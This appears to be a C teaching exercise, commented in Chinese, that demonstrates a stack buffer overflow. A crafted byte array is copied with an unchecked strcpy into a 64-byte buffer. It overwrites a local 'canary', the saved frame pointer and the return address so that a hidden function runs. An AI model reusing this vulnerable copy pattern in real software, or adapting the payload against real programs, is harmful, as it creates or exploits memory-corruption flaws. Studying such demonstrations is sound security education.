#include "stdio.h"
#include "string.h"

unsigned char payload[] = {
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,     //64字节，合法覆盖
    0x12, 0xff, 0xff, 0xff, 0x31, 0x32, 0x33, 0x34,     //需要额外覆盖4位的canary
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,   //需要多覆盖一行，因为对于64字节的buffer，os会为其补充8字节来缓冲，对于下面有i的循环过程，需要额外补充四字节
    0x33, 0x33, 0x33, 0x33, 0x38, 0x10, 0x00, 0x00,   // caller's ebp & return address
};

void vulnerable_function() {
    unsigned int canary = 0xffffffff;
    char buffer[64]; // 声明一个64字节大小的缓冲区
    strcpy(buffer, payload);
    int i ;
    for (i = 0; i < 10000000; i++) {}
}

void mycode() {
    printf("Stack overflow attack succeeded!\n");
}

int main(int argc, char *argv[]) {
    vulnerable_function();
    return 0;
}